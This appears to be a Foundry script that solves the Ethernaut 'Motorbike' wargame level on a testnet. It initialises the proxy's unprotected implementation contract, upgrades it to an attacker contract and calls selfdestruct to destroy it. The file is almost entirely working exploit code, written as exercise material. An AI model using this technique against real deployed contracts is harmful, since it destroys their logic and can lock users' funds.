// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address motorbike = vm.envAddress("MOTORBIKE_INSTANCE");
    address engine = vm.envAddress("ENGINE_INSTANCE"); // cast storage -r $RPC_OP_SEPOLIA $MOTORBIKE_INSTANCE 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc # IMPLEMENTATION_SLOT
    address my_eoa_wallet = vm.envAddress("MY_EOA_WALLET");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        // Step1: call `engine.initialize()`
        engine.call(abi.encodeWithSignature("initialize()"));

        // Step2-1: create our `BustingEngine` contract
        BustingEngine busting_engine = new BustingEngine();

        // Step2-2: call `engine.upgradeToAndCall(newImplementation=BustingEngine, data="bust()") to destruct `engine` contract
        engine.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(busting_engine), abi.encodeWithSignature("bust()")));

        vm.stopBroadcast();
    }
}


contract BustingEngine {
    function bust() public {
        selfdestruct(payable(tx.origin));
    }
}